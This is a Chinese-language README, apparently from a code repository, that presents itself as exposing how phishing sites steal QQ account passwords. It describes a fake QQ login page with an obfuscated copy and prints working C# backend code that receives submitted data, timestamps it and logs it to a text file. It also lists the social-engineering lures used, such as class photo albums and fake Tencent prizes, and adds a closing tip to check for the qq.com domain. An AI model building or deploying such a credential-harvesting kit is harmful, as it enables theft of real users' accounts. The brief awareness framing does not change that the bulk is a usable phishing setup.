# getQQNumberAndPwd
揭秘钓鱼网站是如何盗取你们的账号密码的（以qq为例）

##纯页面程序
`index.html`未加密，`ui.ptlogin2.qq.login.html`是它的加密版。`ajax.js`是自己写的纯`javascript-ajax`调用，因为引用JQ的话文件加载回比较慢，这里就用了自己写的东东。

##至于后端用于记录Info的东东。那个太简单，页面我就不放了。代码写下来吧。
```
 public void ProcessRequest(HttpContext context)
        {
            //在此处写入您的处理程序实现。
            context.Response.AddHeader("Access-Control-Allow-Origin", "*");
            context.Response.ContentType = "text/plain";
            context.Response.Clear();
            context.Response.Charset = "UTF-8";

            string request = context.Request.Params["msg"];
            if (request != null)
            {
                string path = "Data\\qq\\";
                request = "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "]  " + request;
                FileHelper.WriteFile(path + "qq.txt", request.Replace("local-host","\r\n"));
                context.Response.Write("KO");
            }
            else { 
                context.Response.Redirect("http://www.baidu.com");
            }
            context.Response.End();
        }
        
        private static string _RootPath = System.Web.HttpRuntime.AppDomainAppPath.ToString();
        
        /// <summary>
        /// 写文件 | 文本
        /// </summary>
        /// <param name="path">文件相对路径</param>
        /// <param name="Strings">文本内容</param>
        public static void WriteFile(string path, string Strings)
        {
            path = _RootPath + path;
            string pathD = path.Substring(0, path.LastIndexOf("\\"));
            if (Directory.Exists(pathD) == false) //目录是否存在,不存在则没有此目录
            {
                Directory.CreateDirectory(pathD);
            }
            System.IO.StreamWriter f2 = new System.IO.StreamWriter(path, true, System.Text.Encoding.UTF8);
            f2.WriteLine(Strings); 
            f2.Dispose();
        }
 ```

#程序就是这么简单，至于骗法万变不离其宗，无非就是同学相册啊，聚会相册啊，获得腾讯大奖啊之类。只要大家记住腾讯的登录域名qq.com就一定不会骗喽~
